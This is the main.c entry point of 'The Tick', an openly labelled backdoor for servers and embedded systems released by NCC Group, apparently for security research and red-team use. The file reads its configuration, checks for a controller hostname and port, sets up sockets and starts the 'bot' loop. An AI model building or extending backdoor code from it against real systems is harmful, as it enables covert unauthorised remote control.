/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include "main.h"

#include "config.h"
#include "command.h"
#include "parser.h"

#if TICK_CONFIG_USE_ARGV
int main(int argc, char *argv[])
#else
int main(void)
#endif
{
    // If there is a --help switch, show the help and quit.
#if TICK_VERBOSE
# if TICK_CONFIG_USE_ARGV
    if (argc > 1) {
        int x;
        for (x = 1; x < argc; x++) {
            if (strcmp(argv[x], "--help") == 0) {
                show_help(NULL, argv[0]);
                return 0;
            }
        }
    }
# endif
# if TICK_CONFIG_USE_ENV
    char *env = getenv(QUOTE(TICK_CONFIG_ENV_NAME));
    if (env != NULL) {
        env = strstr(env, "--help");
        if (env != NULL) {
            show_help(NULL, argv[0]);
            return 0;
        }
    }
# endif
#endif

    // Get the configuration for the bot.
    Settings s;
#if TICK_CONFIG_USE_ARGV
    get_configuration(&s, argc, argv);
#else
    get_configuration(&s, 0, NULL);
#endif

    // If we don't have a hostname and port to connect to, quit.
    if (s.hostname[0] == 0 || s.port == 0) {
#if TICK_VERBOSE
#if TICK_CONFIG_USE_ARGV
        show_help(&s, argv[0]);
#else
        show_help(&s, NULL);
#endif
#endif
        return 1;
    }

#ifdef _WIN32

    // On Windows, we must initialize the sockets library.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        LOG("Failed to initialize Windows sockets, error code: %d\n", (int) GetLastError());
        return 0;
    }

#else

    // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
    signal(SIGPIPE, SIG_IGN);

#endif

    // Run the bot.
    return run(&s);
}
